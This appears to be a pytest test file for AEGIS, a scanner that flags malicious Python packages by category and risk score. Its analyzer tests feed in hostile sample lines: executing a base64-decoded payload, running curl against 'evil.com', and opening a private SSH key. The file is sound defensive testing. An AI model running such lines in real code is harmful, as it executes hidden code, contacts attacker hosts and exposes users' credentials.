"""Tests for AEGIS package analyzer."""

from pathlib import Path

import pytest

from aegis.analyzer.package import (
    scan_directory,
    _analyze_file_python,
    _calculate_risk_score,
)


FIXTURES = Path(__file__).parent.parent / "fixtures"


class TestScanDirectory:
    def test_scan_malicious_package(self):
        malicious_dir = FIXTURES / "malicious_setup_py"
        if not malicious_dir.exists():
            pytest.skip("Fixture not found")

        result = scan_directory(malicious_dir)
        assert len(result["findings"]) > 0
        assert result["risk_score"] > 0.3

        # Should detect multiple categories
        categories = {f["category"] for f in result["findings"]}
        assert "code_execution" in categories or "process_spawn" in categories

    def test_scan_safe_package(self):
        safe_dir = FIXTURES / "safe_package"
        if not safe_dir.exists():
            pytest.skip("Fixture not found")

        result = scan_directory(safe_dir)
        # Safe package should have minimal or no findings
        critical = [f for f in result["findings"] if f["severity"] == "critical"]
        assert len(critical) == 0


class TestPythonFallbackAnalyzer:
    def test_detect_exec(self):
        content = "exec(base64.b64decode(payload))"
        findings = _analyze_file_python(content, "setup.py", "python_setup")
        assert any(f["category"] == "code_execution" for f in findings)

    def test_detect_subprocess(self):
        content = 'subprocess.call(["curl", "http://evil.com"])'
        findings = _analyze_file_python(content, "setup.py", "python_setup")
        assert any(f["category"] == "process_spawn" for f in findings)

    def test_detect_credential_access(self):
        content = 'open(os.path.expanduser("~/.ssh/id_rsa"))'
        findings = _analyze_file_python(content, "setup.py", "python_setup")
        assert any(f["category"] == "credential_access" for f in findings)

    def test_safe_code(self):
        content = '''
from setuptools import setup
setup(name="safe", version="1.0", packages=["safe"])
'''
        findings = _analyze_file_python(content, "setup.py", "python_setup")
        assert len(findings) == 0


class TestRiskScore:
    def test_empty(self):
        assert _calculate_risk_score([]) == 0.0

    def test_critical(self):
        findings = [{"severity": "critical"}]
        assert _calculate_risk_score(findings) >= 0.5

    def test_low(self):
        findings = [{"severity": "low"}]
        score = _calculate_risk_score(findings)
        assert 0 < score < 0.1

    def test_capped_at_one(self):
        findings = [{"severity": "critical"}] * 10
        assert _calculate_risk_score(findings) == 1.0
